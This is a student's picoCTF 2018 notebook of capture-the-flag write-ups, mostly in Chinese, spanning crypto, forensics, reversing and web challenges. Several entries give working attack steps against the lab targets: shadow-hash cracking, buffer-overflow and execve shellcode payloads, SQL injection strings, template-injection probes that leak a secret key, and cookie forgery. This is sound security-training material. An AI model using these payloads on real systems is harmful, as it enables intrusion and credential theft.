0406 Training - picoCTF2018 筆記5
===

* [picoCTF 2018](https://2018game.picoctf.com/news)

---

## HEEEEEEERE'S Johnny! (Cryptography)


> Okay, so we found some important looking files on a linux computer. Maybe they can be used to get a password to the process. Connect with nc 2018shell.picoctf.com 40157. Files can be found here: [passwd](https://2018shell.picoctf.com/static/7a017af70c0b86ab002896616376499e/passwd) [shadow](https://2018shell.picoctf.com/static/7a017af70c0b86ab002896616376499e/shadow).

0. 明顯是要我們crack root的帳號。

1. 先看看passwd
```
# passwd
root:x:0:0:root:/root:/bin/bash

# 1~7欄依序為：
# 登入名稱
# 加密的密碼(無x表示無密碼)
# user ID
# group ID
# 完整帳號名稱
# home directory
# default shell (usually set to /bin/bash)
```

2. 再看看shadow
```
# shadow
root:$6$IGI9prWh$ZHToiAnzeD1Swp.zQzJ/Gv.iViy39EmjVsg3nsZlfejvrAjhmp5jY.1N6aRbjFJVQX8hHmTh7Oly3NzogaH8c1:17770:0:99999:7:::

# 1~9欄依序為：
# 登入名稱
# 上次密碼變更日期(從1970.1.1起的天數)
# 兩次修改密碼間隔天數
# 兩次修改密碼間隔最多天數
# 密碼過期後，可登入修改密碼期限
# 帳號過期日期
# 保留欄位

# 加密的密碼具有固定格式：
#
# $id$salt$encrypted
#
# id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 
# salt表示密碼學中的Salt,系统隨機生成
# encrypted表示密碼的hash
```

3. John the Ripper破解
```bash
> john --wordlist=/usr/share/john/password.lst ./shadow
...
> john --show ./shadow 
root:password1:17770:0:99999:7:::

1 password hash cracked, 0 left
> nc 2018shell.picoctf.com 40157
Username: root
Password: password1
picoCTF{XXXXXXXXXXX}
```
* 參考資料
    * [Crack Shadow Hashes After Getting Root on a Linux System](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
    * [Linux下的密码Hash——加密方式与破解方法的技术整理](https://3gstudent.github.io/3gstudent.github.io/Linux%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81Hash-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/)
    * [Linux 的 /etc/shadow 檔案結構：儲存真實密碼的地方](https://blog.gtwang.org/linux/linux-etc-shadow-file-format/)

---

## admin panel (Forensics)

>We captured some [traffic](https://2018shell.picoctf.com/static/1a6db339e11fa100ef52d944edaa9612/data.pcap) logging into the admin panel, can you find the password?

在封包裡翻找一下，follow第68個封包的TCP stream，就會看到了
```
POST /login HTTP/1.1
Host: 192.168.3.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.3.128/
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: keep-alive
Upgrade-Insecure-Requests: 1

user=admin&password=picoCTF{XXXXXXXXXXX}
```

---

## assembly-0 (Reversing)

> What does asm0(0xaa,0xf2) return? Submit the flag as a hexadecimal value (starting with '0x'). NOTE: Your submission for this question will NOT be in the normal flag format. [Source](https://2018shell.picoctf.com/static/5359d5442f2379ae9948dfeebe80d8f8/intro_asm_rev.S) located in the directory at /problems/assembly-0_2_485b2d48345b19addbeb06a36aabdc74.

0. 先看看Source
```
# intro_asm_rev.S

.intel_syntax noprefix
.bits 32

.global asm0

asm0:
        push    ebp
        mov     ebp,esp
        mov     eax,DWORD PTR [ebp+0x8]    # eax = [ebp+0x8]，[ebp+0x8]即第一個參數0xaa
        mov     ebx,DWORD PTR [ebp+0xc]    # ebx = [ebp+0xc]，[ebp+0xc即第二個參數0xf2
        mov     eax,ebx                    # eax = ebx
        mov     esp,ebp
        pop     ebp
        ret
```
1. 所以return的 eax = 0xf2

---

## environ (General Skills)

> Sometimes you have to configure environment variables before executing a program. Can you find the flag we've hidden in an environment variable on the shell server?

0. 在web shell裡玩玩
```
> env
> echo $FLAG
> echo $PATH
> evc
SECRET_FLAG=picoCTF{XXXXXXXXX}
```
1. 莫名奇妙就出現惹???

---

## buffer overflow 0 (Binary Exploitation)

> Let's start off simple, can you overflow the right buffer in this [program](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17 on the shell server. [Source](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln.c).

0. 先看看Source
```c
...
...
...
if (argc > 1) {
    vuln(argv[1]);
    f("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}
```

1. 所以要一個參數，直接overflow看看

```b
Ice1187@pico-2018-shell: ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{XXXXXXXXXXXXXXXXX}
```

---

## ertz (Cryptography)

> Here's another simple cipher for you where we made a bunch of substitutions. Can you decrypt it? Connect with nc 2018shell.picoctf.com 48487.

0. 先`nc`看看
```
-------------------------------------------------------------------------------
lbqkstup wysy rp hbms dctk - pmxpurumurbq_lrnwysp_tsy_pbcotxcy_lirckqicqn
-------------------------------------------------------------------------------
putuych, ncmfn xmle fmccrktq ltfy dsbf uwy putrswyti, xytsrqk t xbvc bd
ctuwys bq vwrlw t frssbs tqi t stzbs cth lsbppyi. t hyccbv isypprqkkbvq,
mqkrsicyi, vtp pmputrqyi kyquch xywrqi wrf bq uwy frci fbsqrqk trs. wy
wyci uwy xbvc tcbdu tqi rqubqyi:
...
...
```

1. 蠻明顯是替換式加密，直接詞頻分析
    * [quipqiup](https://quipqiup.com/)

```
congrats here is your flag - substitution_ciphers_are_sol?able_cdilgndlnp stately, ......
```

2. ?處猜測是v，solvable


---

## ssh-keyz (General Skills)

> As nice as it is to use our webshell, sometimes its helpful to connect directly to our machine. To do so, please add your own public key to ~/.ssh/authorized_keys, using the webshell. The flag is in the ssh banner which will be displayed when you login remotely with ssh to with your username.

* HINT
    * [pico2017 keyz](https://www.youtube.com/watch?v=3CN65ccfllU&list=PLJ_vkrXdcgH-lYlRV8O-kef2zWvoy79yP&index=4)

0. 本機shell:
```b
Ice1187: ssh-keygen -t rsa -C 'Ice1187'
Ice1187: cat /root/.ssh/id_rsa.pub
ssh-rsa ...... root@kali
```

1. webshell:
```b
> mkdir .ssh
> vim authorized_keys    # 將本機shell cat產生的所有內容貼進去
> chmod 600 ./.ssh/authorized_keys
```

2. 本機shell:
```b
Ice1187: ssh Ice1187@2018shell.picoctf.com
...
...
...
picoCTF{XXXXXXXX}
```

---

## Truly an Artist (Forensics)

> Can you help us find the flag in this [Meta-Material](https://2018shell.picoctf.com/static/a386ed9a7534702173762cf536dce121/2018.png)? You can also find the file in /problems/truly-an-artist_2_61a3ed7216130ab1c2b2872eeda81348.

0. 用Stegsolve打開 -> Analyse -> File format ，其中一行即為flag

---

## assembly-1 (Reversing)

> What does asm1(0xc8) return? Submit the flag as a hexadecimal value (starting with '0x'). NOTE: Your submission for this question will NOT be in the normal flag format. [Source](https://2018shell.picoctf.com/static/88fdf76b0f4d3f3bf9eff14ef98bbaa9/eq_asm_rev.S) located in the directory at /problems/assembly-1_4_99ac7ff5dfe75417ed616e35bfc2c023.

0. 看asm
```b
.intel_syntax noprefix
.bits 32
        
.global asm1

asm1:
        push    ebp
        mov     ebp,esp
        cmp     DWORD PTR [ebp+0x8],0x9a    # 0xc8 跟 0x9a 比較
        jg      part_a                      # Jump if Greater -> part_a 
        cmp     DWORD PTR [ebp+0x8],0x8
        jne     part_b
        mov     eax,DWORD PTR [ebp+0x8]
        add     eax,0x3
        jmp     part_d
part_a:
        cmp     DWORD PTR [ebp+0x8],0x2c    # 0xc8 跟 0x2c 比較
        jne     part_c                      # Jump if Not Equal -> part_c
        mov     eax,DWORD PTR [ebp+0x8]
        sub     eax,0x3
        jmp     part_d
part_b:
        mov     eax,DWORD PTR [ebp+0x8]
        sub     eax,0x3
        jmp     part_d
        cmp     DWORD PTR [ebp+0x8],0xc8
        jne     part_c
        mov     eax,DWORD PTR [ebp+0x8]
        sub     eax,0x3
        jmp     part_d
part_c:
        mov     eax,DWORD PTR [ebp+0x8]    # eax = 0xc8
        add     eax,0x3                    # eax = eax + 0x3 -> 0xcb
part_d:
        pop     ebp
        ret
```

---

## be-quick-or-be-dead-1 (Reversing)

> You find this when searching for some music, which leads you to [be-quick-or-be-dead-1](https://2018shell.picoctf.com/static/1a796b0425170aa031a6ad476c64bf75/be-quick-or-be-dead-1). Can you run it fast enough? You can also find the executable in /problems/be-quick-or-be-dead-1_1_d0d1dc1d01c7fd569eac77763d813c6f.

0. 下載檔案
```
$: scp Ice1187@2018shell.picoctf.com:/problems/.../be-quick-or-be-dead-1 .
```
1. run起來
```b
Ice1187: ./be-quick-or-be-dead-1 
Be Quick Or Be Dead 1
=====================

Calculating key...
You need a faster machine. Bye bye.
```

2. 用gdb試試看(畢竟是要慢)，就得flag(???
```b
Be Quick Or Be Dead 1
=====================

Calculating key...

.
Done calculating key
Printing flag:
picoCTF{XXXXXXXXXXXXXXX}
```
3. 根據`Program received signal SIGALRM, Alarm clock`的警示訊息，應該是運算超時，會自動跳出，但gdb可能擋掉了
    * [SIGALRM (wiki)](https://zh.wikipedia.org/wiki/SIGALRM): 電腦程式通常**使用SIGALRM作為長時間操作的超時訊號**，或提供一種隔一定時間間隔處理某些操作的方式。

3. 後續在<get_key>裡的<caculate_key>看到這段code，應該就是因為這個loop (是要算多久XD
```
<calculate_key+11>:	add    DWORD PTR [rbp-0x4],0x1
<calculate_key+15>:	cmp    DWORD PTR [rbp-0x4],0xe9a5972c
<calculate_key+22>:	jne    0x400711 <calculate_key+11>
```

---

## you can't see me (General)

> '...reading transmission... Y.O.U. .C.A.N.'.T. .S.E.E. .M.E. ...transmission ended...' Maybe something lies in /problems/you-can-t-see-me_4_8bd1412e56df49a3c3757ebeb7ead77f.

0. 就是一個叫做`.`的檔案，考妳用奇怪的方式讀它
```b
: ls -a
. . ..
: head .*
==> . <==
head: error reading '.': Is a directory

==> .   <==
picoCTFXXXXXXXXXXXXX}
head: cannot open '..' for reading: Permission denied
```

---

## What's My Name? (Forensics)
Say my name, say [my name](https://2018shell.picoctf.com/static/b7e6f97343b1e36e6f34f762e95dd819/myname.pcap).
* HINT: If you visited a website at an IP address, how does it know the name of the domain?

0. wireshark打開，UTP stream follow第43個的DNS封包，就會看到flag

1. 考DNS系統怎麼查詢domain name
    * [域名系統 DNS (wiki)](https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F)
    * 參考: [DNS的運作？](http://dns-learning.twnic.net.tw/dns/03opDNS.html)

---

## caesar cipher 2 (Cryptography)

> Can you help us decrypt this message? We believe it is a form of a caesar cipher. You can find the ciphertext in /problems/caesar-cipher-2_1_ac88f1b12e9dbca252d450d374c4a087 on the shell server.

0. 找不到好用的工具，直接自幹!!!
```cpp
#include <iostream>
#include <cstring>
using namespace std;

int main(){
  string table, cipher;
  printf("table: ");
  cin >> table;
  printf("cipher: ");
  cin >> cipher;
  for(int i = 0; i < table.length(); i++){
    printf("\n");
    for(int j =0; j < cipher.length(); j++){
      char c = cipher[j];
      for(int k=0; k < table.length(); k++)
        if(c == table[k]){
          char r = table[k+i];
          printf("%c", r);
          break;
        }
    }
  }    

   return 0;
} 
```

1. 自幹就過了(竟然還不用處理位移循環的問題 ._.)
```
: ./caeser_decoder 
table:  !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
cipher: e^Xd8I;pX6ZhVGT8^E]:gHT_jHITVG:cITh:XJg:r

...
...
...
picoCTF{XXXXXXXXXX}
```

---

## blaise's cipher (Cryptography)

> My buddy Blaise told me he learned about this cool cipher invented by a guy also named Blaise! Can you figure out what it says? Connect with nc 2018shell.picoctf.com 46966.

0. 根據wiki，「維吉尼亞密碼在19世紀時被誤傳為是法國外交官布萊斯·德·維吉尼亞（==Blaise== De Vigenère）所創造，因此現在被稱為「維吉尼亞密碼」。」

1. 簡單觀察cipher，可以猜出它是Vigenere密碼的wiki介紹
```
# cipher
...
Goqmexy Gexslm zwtej yz rkulix yse hwzkks nivmpr (iwpaznyg zmp Vkwyas–Atgksprk htpnjc it 1918), 

# wiki
Gilbert Vernam tried to repair the broken cipher (creating the Vernam–Vigenère cipher in 1918), 
```

2. 直接丟工具解
    * [dcode](https://www.dcode.fr/vigenere-cipher)
    * 先`TRY TO DECRYPT AUTOMATICALLY (STATISTICAL ANALYSIS)`得Key = FLAG，再解

---

## buffer overflow 1 (Binary Exploitation)

> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program? You can find it in /problems/buffer-overflow-1_3_af8f83fb19a7e2c98e28e325e4cacf78 on the shell server. [Source](https://2018shell.picoctf.com/static/304de0741561b9f80c664ea941922b03/vuln.c).

0. 嘗試patch長度

```b
: python -c "print 'a'*44 + 'abcdef'" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x64636261
Segmentation fault (core dumped)
```
1. 打開objdump，找到一個`<win>`function在`080485cb`
```b
080485cb <win>:
 80485cb:	55                   	push   ebp
 80485cc:	89 e5                	mov    ebp,esp
 80485ce:	83 ec 58             	sub    esp,0x58
```
2. 撰寫payload，得flag
```b
: python -c "print 'a'*44 + \xcb\x85\x04\x08'" | ./vuln

Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{XXXXXXXXXXXXX}Segmentation fault (core dumped)
```
* 參考
    * [Why is my stack buffer overflow exploit not working?](https://stackoverflow.com/questions/39732600/why-is-my-stack-buffer-overflow-exploit-not-working)

---

## hertz 2 (Cryptography)

> This flag has been encrypted with some kind of cipher, can you decrypt it? Connect with nc 2018shell.picoctf.com 12521.
 
```
Mwq dvcpg oehxy shl uvbjf hrqe mwq kiza nht.
C piy'm oqkcqrq mwcf cf fvpw iy qifa jehokqb cy Jcph.
Cm'f ikbhfm if cs C fhkrqn i jehokqb ikeqina!
Hgia, scyq. Wqeq'f mwq skit: 
jcphPMS{fvofmcmvmchy_pcjwqef_ieq_mhh_qifa_tbycocemyr}
```

0. 最後很明顯是flag，還是[詞頻分析](https://quipqiup.com/)
    * `jcphPMS = picoCTF`

---

## Mr. Robots (Web Exploitation)

> Do you see the same things I see? The glimpses of the flag hidden away? http://2018shell.picoctf.com:10157 (link)

0. 看`robots.txt`

---


## learn gdb (General Skills)

> Using a debugging tool will be extremely useful on your missions. Can you run this program in gdb and find the flag? You can find the file in /problems/learn-gdb_2_32e08c18932eb88649e9b97f3020b9f5 on the shell server.

0. 跑看看
```b
:./run 
Decrypting the Flag into global variable 'flag_buf'
.....................................
Finished Reading Flag into global variable 'flag_buf'. Exiting.
```

1. 所以印出找flag_buf

```b
<main>
...
   0x00000000004008fb <+50>:	callq  0x400600 <puts@plt>
   0x0000000000400900 <+55>:	mov    $0x0,%eax
   0x0000000000400905 <+60>:	callq  0x400786 <decrypt_flag>
   0x000000000040090a <+65>:	mov    $0x400a08,%edi
   0x000000000040090f <+70>:	callq  0x400600 <puts@plt>
   0x0000000000400914 <+75>:	mov    $0x0,%eax
   0x0000000000400919 <+80>:	leaveq 
   0x000000000040091a <+81>:	retq   
```

2. 斷點下在<main+65>，`flag_buf`在`0x6013e8`
``` b
0x00000000004007a7 <+33>:	mov    %rax,0x200c3a(%rip)        # 0x6013e8 <flag_buf>
0x00000000004007ae <+40>:	mov    0x200c33(%rip),%rax        # 0x6013e8 <flag_buf>
```

3. 印出flag

```b
gdb: x *0x6013e8
0x1507010:	"picoCTF{XXXXXXXXXXXXXX}"
```

---

## buffer overflow 2 (Binary Exploitation)

> Alright, this time you'll need to control some arguments. Can you get the flag from this program? You can find it in /problems/buffer-overflow-2_0_738235740acfbf7941e233ec2f86f3b4 on the shell server. Source.

* 參考
    * [cyclic, dmesg指令，一定要學 ><](https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/buffer%20overflow%202.md)
    * [pwntools doc](http://docs.pwntools.com/en/stable/intro.html)

```
Ice1187@pico-2018-shell:/problems/buffer-overflow-2_0_738235740acfbf7941e233ec2f86f3b4$ python -c "print 'a'*112 + '\xcb\x85\x04\x08' + 'a'*4 + '\xef\xbe\xad\xde' + '\xde\xc0\xad\xde'" | ./vuln 
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ�����
picoCTF{XXXXXXXXXXXXXXXXXXX}Segmentation fault (core dumped)
```

---

## quackme (Reversing)

> Can you deal with the Duck Web? Get us the flag from this program. You can also find the program in /problems/quackme_2_45804bbb593f90c3b4cefabe60c1c4e2.

0. note while dis_asm
```
# input: aaaaaaaaaaaaaaaaaaaa

<do_magic>:

ebp-0x14: input         # a*20
ebp-0x10: len of input  # 21
ebp-0xc : a variable created by malloc


<do_magic+93>:

# The C library ref
#
# 2.14.6 memset
# Declaration:
#
# void *memset(void *str, int c, size_t n);
#
# Copies the character c (an unsigned char) to the first n characters of the string pointed to by the argument str.
#
# The argument str is returned.

ebp-0xc is a 16-byte varibel, all bytes are 0.

<do_magic+107>:
ebp-0x1c = 0
ebp-0x18 = 0

---

> All the things seems to start since jumping to <+123> 
> It seems that the magic is xor input with \x4f\x16\x06\x29 (little endian). Then store the result into ebp-0x1d

<+150>:
ds:0x804a038 = "You have now entered the Duck Web, and you're in for a honkin' good time.\nCan you figure out my trick?"

the result of xor will cmp with ds:0x804a038

ebp-0x18: the iterator of the loop # for i %(0, len(input))
ebp-0x1c: might be counting how many xored_char is equaled to ds:0x804a038, it has to be greater then 0x19 to trigger something different.

xor key(ds:0x804a038): \x29\x06\x16\x4f\x2b\x35\x30\x1e\x51\x1b\x5b\x14\x4b\x08\x5d\x2b\x56\x47\x57\x50\x16\x4d\x51\x51\x5d\x00\x4e\x6f

> In for loop(ebp-0x18), When a char of the result of 'input xor key' equals to ds:0x804a038, ebp-0x1c increase 1. As long as ebp-0x1c is greater then 0x19, something happen(?)
```

1. input xor key = flag

* ref
    * [The C library Reference Guide - memset ](http://www.fortran-2000.com/ArnaudRecipes/Cstd/2.14.html#memset)
    * [XOR calculator](http://xor.pw/#)

---

## Desrouleaux (Forensics)

> Our network administrator is having some trouble handling the tickets for all of of our incidents. Can you help him out by answering all the questions? Connect with nc 2018shell.picoctf.com 54782. [incidents.json](https://2018shell.picoctf.com/static/47cbb94e79b74a4b2f74cfb31c68230e/incidents.json)

0. `slove.py`
```python
#!/usr/bin/python

from pwn import *

r = remote('2018shell.picoctf.com', 54782)

print r.recvline()
r.recvline()
r.recvline()

while 1:
  problem = r.recvline()
  print problem
  if problem.startswith("What is the most common source IP address?"):
    r.sendline('246.69.53.233')
  elif problem.startswith("How many unique destination IP addresses were targeted by the source IP address 231.205.245.44?"):
    r.sendline('1')
  elif problem.startswith("How many unique destination IP addresses were targeted by the source IP address 246.69.53.233?"):
    r.sendline('3')
  elif problem.startswith("How many unique destination IP addresses were targeted by the source IP address 251.165.34.242?"):
    r.sendline('3')
  elif problem.startswith("How many unique destination IP addresses were targeted by the source IP address 215.239.98.18?"):
    r.sendline('1')
  elif problem.startswith("What is the number of unique destination ips a file is sent, on average?"):
    r.sendline('1.40')
  print 'line: ' + r.recvline()
  print 'line: ' + r.recvline()
  print 'line: ' + r.recvline()

r.close()

```

---

## shellcode (Binary Exploitation)

> This [program](https://2018shell.picoctf.com/static/dd374b1b011341e516ddaaca8bcf7323/vuln) executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd on the shell server. [Source](https://2018shell.picoctf.com/static/dd374b1b011341e516ddaaca8bcf7323/vuln.c).

0. assmble
```a
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax        # 仍然不太清楚後面這段 push eax
push ebx        # push ebc
mov ecx, esp    # 和 mov ecx, esp 的作用是啥
mov al, 0xb
int 0x80
```

1. payload
```b
Ice1187@pico-2018-shell:~$ python -c "print '\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'" > shellcode
Ice1187@pico-2018-shell:~$ cat shellcode - | /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd/vuln
Enter a string!
1�Ph//shh/bin��PS��

Thanks! Executing now...
ls
Ice1187.tar.gz	shellcode  shellcode.sample  shellcode.txt  vuln  vuln.c
cat /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd/flag.txt
picoCTF{XXXXXXXXXXXXXXXXX}
```

* 參考
    * [Online x86 & x64 Assembler](https://defuse.ca/online-x86-assembler.htm#disassembly)
    * [shell-storm](http://shell-storm.org/shellcode/files/shellcode-827.php)

---

## Logon (Web Exploitation)

> I made a website so now you can log on to! I don't seem to have the admin password. See if you can't get to the flag. http://2018shell.picoctf.com:5477 ([link](http://2018shell.picoctf.com:5477/))

0. 只有`username = admin`的時候會檢查`password`

1. 觀察`username = a; password = `的cookie，發現有`admin = False`
```
Response Cookies:

[Name]   |[Value]
admin    |False
password |
username |a
```

2. 用cookie-editor set `username = admin; admin = True`後，重整頁面

3. Get flag~

---

## Irish Name Repo (Web Exploitation)

> There is a website running at http://2018shell.picoctf.com:52135 ([link](http://2018shell.picoctf.com:52135/)). Do you think you can log us in? Try to see if you can login!

0. 基礎的SQL injection : `username = admin; password = ' or 1=1 /*`

1. Get flag!

---

## No Login (Web Exploitation)

> Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. http://2018shell.picoctf.com:10573 ([link](http://2018shell.picoctf.com:10573/))

0. "never got around to making a login, but I heard there was a flag ==if you were the admin.=="，所以要讓對方以為你是admin

1. 建立一個cookie，`name=admin; value=True`

2. Get flag.

3. 誤打誤撞的一題。因為剛解完Logon，cookie還存著，點Flag就直接跳出flag了，一開始整個黑人問號 XD

---

## Secret Agent (Web Exploitation)

> Here's a little website that hasn't fully been finished. But I heard google gets all your info anyway. http://2018shell.picoctf.com:3827 ([link](http://2018shell.picoctf.com:3827/))

0. "==google== gets all your info anyway. "，所以要從`User-Agent`偽裝成google

1. 用Burp Suite set`User-Agent: Googlebot-Image/1.0`

2. Get flagoogle~

* 參考
    * [Googlebot User Agents](https://developers.whatismybrowser.com/useragents/explore/software_name/googlebot/)

---

## Buttons (Web Exploitation)

> There is a website running at http://2018shell.picoctf.com:21579 ([link](http://2018shell.picoctf.com:21579/)). Try to see if you can push their buttons.

0. 用Brup Suite觀察`request`，發現`button1`用`POST`，`button2`用`GET
```
POST /button1.php HTTP/1.1
Host: 2018shell.picoctf.com:21579

GET /button2.php HTTP/1.1
Host: 2018shell.picoctf.com:21579
```

1. 將`button2`改成`POST`送過去

2. Get button.

---

## The Vault (Web Exploitation)
> There is a website running at http://2018shell.picoctf.com:22430 ([link](http://2018shell.picoctf.com:22430/)). Try to see if you can login!

0. php source code
```p
$username = $_POST["username"];
$password = $_POST["password"];
$debug = $_POST["debug"];
$query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";

//validation check
$pattern ="/.*['\"].*OR.*/i";
$user_match = preg_match($pattern, $username);
$password_match = preg_match($pattern, $username);
```

1. SQL injection，仔細看會發現`password_match`檢查的是`username`，所以password是沒有檢查的 XD

2. `username = admin; passeord = ' or 1=1 /*`

3. Get sqlag!

---

## Flaskcards (Web Exploitation)

> We found this fishy [website](http://2018shell.picoctf.com:17991/) for flashcards that we think may be sending secrets. Could you take a look?
>
> Hint1: Are there any common vulnerabilities with the backend of the website?
> 
> Hint2: Is there anywhere that filtering doesn't get applied?

0. 據 Hint1 ，先 google 一下，發現`flask`是一個用 Python 寫的 Web應用程式框架。其中存在一種漏洞：`Server-Side Template Injection (SSTI)`

1. 參考[`SSTI`]，在`Create Card`做測試(https://portswigger.net/blog/server-side-template-injection)
```
Create Card1
Q: 7*7
A: {{7*7}}

List Cards1
Q: 7*7
A: 49        # Found SSTI vulnerability

CC2
Q: identify
A: {{7*'7'}}

LC2
Q: identify
A: 7777777    # indentify it uses Jinja2 as the template engine

...trying...

CC3
Q: config
A: <Config {'SEEK_CUR': 1, ..., 'SECRET_KEY': 'picoCTF{XXXXXXXXXXXXXXX}'
```

2. Get flask!

* 參考
    * [angstromctf-2018-web-writeups](https://medium.com/bugbountywriteup/angstromctf-2018-web-writeups-part-2-6c1ee586aa64)
    * [server-side-template-injection](https://portswigger.net/blog/server-side-template-injection)

---

## Help Me Reset 2 (Web Exploitation)

> There is a website running at http://2018shell.picoctf.com:29523 ([link](http://2018shell.picoctf.com:29523). We need to get into any user for a flag!

0. According to the source code, `<!--Proudly maintained by oakley-->`, we can guess that there is a user call `oakley`.

1. After typing `oakley` into reset page, the server will ask a few quesions. And I have totally no ideas what the answer might be. Except hero, it's `Hulk`. (Wasting so much time in this step, QQ)

2. So, I use `dirsearch` trying to find some clues.
```b
Ice1187@kali:dirsearch$ ./dirsearch.py -u http://2018shell.picoctf.com:29523 -r -e php

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 10 | Wordlist size: 6009

Error Log: /root/ctf/tools/dirsearch/logs/errors-19-05-01_11-28-07.log

Target: http://2018shell.picoctf.com:29523

[11:28:08] Starting: 
[11:32:07] 200 - 1019B  - /login
[11:32:12] 302 -  209B  - /logout  ->  http://2018shell.picoctf.com:29523/
[11:33:06] 200 -  804B  - /profile
[11:33:14] 200 -  899B  - /reset

Task Completed
```

3. Find flag in `/profile`.

---

## Recovering From the Snap (Forensics)

> There used to be a bunch of [animals](https://2018shell.picoctf.com/static/040c56434beb57348cc5032272c04350/animals.dd) here, what did Dr. Xernon do to them?

0. `foremost animals.dd`

1. `./output/`中，最後一張即為flag

---

## Aca-Shell-A (General Skills)

> It's never a bad idea to brush up on those linux skills or even learn some new ones before you set off on this adventure! Connect with `nc 2018shell.picoctf.com 42334`.

0. commands
```
$ ls
$ cd secret
$ ls
$ rm in*
$ cd ..
$ cd executables
$ echo 'Drop it in!'
$ ls
$ ./dontLookHere
$ whoami
$ cd ..
$ cp /tmp/TopSecret passwords
$ cd passwords
cat TopSecret
```


---

## SpyFi (Cryptography) 未解

> James Brahm, James Bond's less-franchised cousin, has left his secure communication with HQ running, but we couldn't find a way to steal his agent identification code. Can you? Conect with nc 2018shell.picoctf.com 31123. [Source](https://2018shell.picoctf.com/static/f9909c1c64f38650320493c56da6a0c6/spy_terminal_no_flag.py).
> 
* 參考
    * [AES - ECB mode (wiki)](https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F#%E7%94%B5%E5%AD%90%E5%AF%86%E7%A0%81%E6%9C%AC%EF%BC%88ECB%EF%BC%89)
    * [writeup of smiliar problem](https://github.com/liamh95/CTF-writeups/tree/8bf53b29c3de963d2e4cbb0734286e6c33d2fbaa/CSAW17/baby_crypt)
    * [ASCII Table](https://www.cs.cmu.edu/~pattis/15-1XX/common/handouts/ascii.html)




---

###### tags: `CTF` `Training` `picoCTF` `writeup`



